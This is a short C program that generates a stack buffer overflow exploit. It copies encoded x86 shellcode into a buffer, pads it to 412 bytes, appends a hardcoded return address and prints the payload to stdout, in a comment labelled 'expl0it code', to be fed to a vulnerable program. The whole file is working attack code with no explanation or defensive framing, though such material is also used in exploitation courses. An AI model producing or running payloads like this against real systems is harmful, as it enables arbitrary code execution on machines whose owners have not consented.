#include<stdio.h>
#include<string.h>

unsigned char *shellcode =
"\xbf\xc8\xd1\x60\xac\xd9\xf6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x11\x31\x7d\x15\x03\x7d\x15\x83\xed\xfc\xe2\x3d\xe0\xa9\x9d"
"\x66\xf4\xc9\x6e\x3c\x36\x8d\xe5\x37\x91\x17\xab\x21\x49\x05"
"\x2f\x24\x6e\x3d\x80\x45\x19\xbe\xb6\x86\xbb\xd7\x28\x51\xd8"
"\x7a\x5d\x6e\x1f\x7b\x9d\x03\x77\x5b\xa1\xdd\xa7\xb4\xbd\x44"
"\xde\xe5\x49\xf2\x67\xfa\xe6\xa9\x1e\x1b\xc5\xcd\x10\x07\xbc"
"\xcc\x0a\x7a\xc1";

unsigned char *address = "\x1c\xf1\xff\xbf"; 


int main(void)
{
    unsigned char buffer[512]; 
    int i, j;
    
    // copy shellcode to buffer
    for (i = 0; i < strlen(shellcode); i++)
    {
        buffer[i] = shellcode[i];
    }
    
    // pad buffer to 412 characters
    for (; i < 412; i++)
    {
        buffer[i] = ' ';  
    }
    
    // copy address to buffer
    for (j = 0; j < 4; i++, j++)
    {
        buffer[i] = address[j]; 
    }
    
    // string-terminate buffer
    buffer[i] = '\0';

    // print expl0it code to stdout
    printf("%s", buffer);

    return 0;
}
